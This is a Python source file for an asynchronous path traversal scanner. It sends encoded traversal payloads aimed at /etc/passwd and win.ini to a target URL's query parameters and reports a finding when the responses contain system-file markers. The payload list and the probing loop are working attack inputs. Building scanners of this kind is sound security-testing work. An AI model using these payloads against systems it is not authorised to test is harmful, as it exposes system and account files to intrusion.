import aiohttp
from typing import List, Dict
from urllib.parse import urljoin, urlparse, parse_qs

class TraversalScanner:
    """Check for path traversal vulnerabilities"""
    
    TRAVERSAL_PAYLOADS = [
        "../../etc/passwd",
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....\/....\/....\/etc/passwd"
    ]
    
    UNIX_INDICATORS = [
        "root:",
        "/bin/bash",
        "/bin/sh",
        "daemon:",
        "nobody:"
    ]
    
    WINDOWS_INDICATORS = [
        "[fonts]",
        "[extensions]",
        "for Windows",
        "MAPI=1"
    ]
    
    def __init__(self, target_url: str):
        self.target_url = target_url
    
    async def check(self) -> List[Dict]:
        """Test for path traversal"""
        vulnerabilities = []
        
        try:
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)
            
            if not params:
                return vulnerabilities
            
            # Common file parameters
            file_params = list(params.keys()) + ['file', 'path', 'page', 'document', 'folder']
            
            async with aiohttp.ClientSession() as session:
                for param_name in file_params:
                    for payload in self.TRAVERSAL_PAYLOADS:
                        test_params = {param_name: payload}
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        
                        try:
                            async with session.get(test_url, params=test_params, timeout=5) as response:
                                text = await response.text()
                                text_lower = text.lower()
                                
                                # Check for Unix file indicators
                                for indicator in self.UNIX_INDICATORS:
                                    if indicator in text_lower:
                                        vulnerabilities.append({
                                            'title': 'Path Traversal Vulnerability',
                                            'severity': 'critical',
                                            'description': f'The application is vulnerable to path traversal via the {param_name} parameter.',
                                            'owasp': 'A01:2021 – Broken Access Control',
                                            'affected': f'{param_name} parameter',
                                            'mitigation': 'Validate and sanitize file paths. Use whitelist of allowed files. Never construct file paths from user input.'
                                        })
                                        return vulnerabilities
                                
                                # Check for Windows file indicators
                                for indicator in self.WINDOWS_INDICATORS:
                                    if indicator in text:
                                        vulnerabilities.append({
                                            'title': 'Path Traversal Vulnerability',
                                            'severity': 'critical',
                                            'description': f'The application is vulnerable to path traversal via the {param_name} parameter.',
                                            'owasp': 'A01:2021 – Broken Access Control',
                                            'affected': f'{param_name} parameter',
                                            'mitigation': 'Validate and sanitize file paths. Use whitelist of allowed files. Never construct file paths from user input.'
                                        })
                                        return vulnerabilities
                        
                        except:
                            continue
        
        except Exception as e:
            print(f"Traversal scan error: {e}")
        
        return vulnerabilities
